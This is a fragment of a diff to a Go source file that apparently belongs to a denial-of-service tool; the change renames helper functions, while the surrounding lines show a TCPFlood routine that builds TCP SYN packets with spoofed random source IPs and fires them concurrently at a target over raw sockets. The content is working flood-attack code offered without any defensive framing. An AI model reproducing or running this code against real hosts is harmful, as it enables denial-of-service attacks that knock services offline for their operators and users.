@@ -25,7 +25,7 @@ func randIP() string {
 
 // makes the TCP SYN packet with a spoofed source IP and source port
 // returns net/ipv4 header and bytes of tcp packet
-func makePacket(destPortSrc int, destIP net.IP) (*ipv4.Header, []byte) {
+func tcpMakePacket(destPortSrc int, destIP net.IP) (*ipv4.Header, []byte) {
 	// the IP packet
 	ipPacket := layers.IPv4{
 		SrcIP:    net.ParseIP(randIP()),
@@ -63,7 +63,7 @@ func makePacket(destPortSrc int, destIP net.IP) (*ipv4.Header, []byte) {
 
 	ipHeader, err := ipv4.ParseHeader(ipHeaderBuffer.Bytes())
 	if err != nil {
-		handleErr(err)
+		tcpHandleErr(err)
 	}
 
 	tcpBuffer := gopacket.NewSerializeBuffer()
@@ -85,15 +85,15 @@ func TCPFlood(destIPStr string, totalPacketToSend int) {
 		// this can happen concurrently
 		go func(tcpPorts []int, destIP net.IP) {
 			// making the packet with a random port from list and dest IP
-			ipHeader, packetBytes := makePacket(tcpPorts[rand.Intn(len(tcpPorts))], destIP)
+			ipHeader, packetBytes := tcpMakePacket(tcpPorts[rand.Intn(len(tcpPorts))], destIP)
 			packetConn, err := net.ListenPacket("ip4:tcp", destIPStr)
 			if err != nil {
-				handleErr(err)
+				tcpHandleErr(err)
 			}
 
 			rawConn, err := ipv4.NewRawConn(packetConn)
 			if err != nil {
-				handleErr(err)
+				tcpHandleErr(err)
 			}
 
 			rawConn.WriteTo(ipHeader, packetBytes, nil)
@@ -105,6 +105,6 @@ func TCPFlood(destIPStr string, totalPacketToSend int) {
 
 }
 
-func handleErr(message error) {
+func tcpHandleErr(message error) {
 	fmt.Println("TCPFLOOD error: " + message.Error())
 }
